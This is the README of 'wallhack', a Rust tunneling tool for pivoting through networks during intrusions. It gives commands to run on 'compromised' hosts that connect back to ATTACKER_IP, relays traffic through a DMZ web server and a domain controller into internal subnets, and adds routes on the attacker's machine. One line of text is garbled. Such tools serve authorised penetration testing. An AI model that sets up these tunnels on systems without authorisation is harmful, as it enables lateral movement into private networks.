# wallhack

![Crates.io Version](https://img.shields.io/crates/v/wallhack)

**wallhack** (plural **wallhacks**)

_(video games)_ A patch enabling a player to cheat by modifying the properties
of walls, as by making them transparent or nonsolid.

Layer 3 tunneling tool for network pivoting.

## Concepts

**Entry** — Probably your machine. Traffic "enters" here. Runs with `--listen`
only.

**Relay** — A host that forwards traffic deeper into the network. Runs with both
`--connect` and `--listen`.

**Exit** — End of the chain. Unwraps packetswe dont ne and sends them to the local
network. Runs with `--connect` only.

## Flags

| Flag                  | Description                   |
| --------------------- | ----------------------------- |
| `--listen :PORT`      | Accept incoming connections   |
| `--connect HOST:PORT` | Establish outgoing connection |

Behavior emerges from flag combinations:

- `--listen` = entry
- `--connect --listen` = relay
- `--connect` = exit

## Usage

### Single Hop

Simplest case. One compromised host, direct tunnel.

**Attacker (entry):**

```bash
wallhack --listen :443
```

**Compromised host (exit):**

```bash
./wallhack --connect ATTACKER_IP:443
```

**Attacker — add routes:**

```bash
ip route add 10.0.0.0/24 dev tun0
ip route add 10.1.0.0/24 dev tun0
```

### Multi-Hop (Relay)

When deeper targets can't reach you directly, chain through a relay.

**Attacker (entry):**

```bash
wallhack --listen :443
```

**DMZ host (relay):**

```bash
./wallhack --connect ATTACKER_IP:443 --listen :6565
```

**Internal host (exit):**

```bash
./wallhack --connect DMZ_IP:6565
```

**Attacker — add routes:**

```bash
ip route add 10.0.0.0/24 dev tun0
ip route add 10.1.0.0/24 dev tun0
ip route add 10.2.0.0/24 dev tun0
```

Traffic to 10.2.0.0/24 flows: Attacker → DMZ → Internal → Target.

## Example: DMZ to Internal Network

Three networks: DMZ (10.0.0.0/24), Office (10.1.0.0/24), Secret (10.2.0.0/24).

Web server (10.0.0.10) can reach your machine and the office network. DC
(10.1.0.1) can reach the DMZ and the secret subnet.

**Attacker (203.0.113.50):**

```bash
wallhack --listen :443
```

**Web server (10.0.0.10) — relay:**

```bash
./wallhack --connect 203.0.113.50:443 --listen :6565
```

**Attacker — route to DMZ and office:**

```bash
ip route add 10.0.0.0/24 dev tun0
ip route add 10.1.0.0/24 dev tun0
```

**DC (10.1.0.1) — exit:**

```bash
./wallhack --connect 10.0.0.10:6565
```

**Attacker — route to secret subnet:**

```bash
ip route add 10.2.0.0/24 dev tun0
```

Traffic to 10.2.0.0/24 flows: Attacker → Web server → DC → Target.

## Installation

```bash
cargo install wallhack
```

## Building

```bash
cargo build --release
```

Cross-compile for targets:

```bash
cross build --release --target x86_64-unknown-linux-musl
cross build --release --target x86_64-pc-windows-gnu
```

## Prior Art

- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng)
- Chisel
- Proxychains
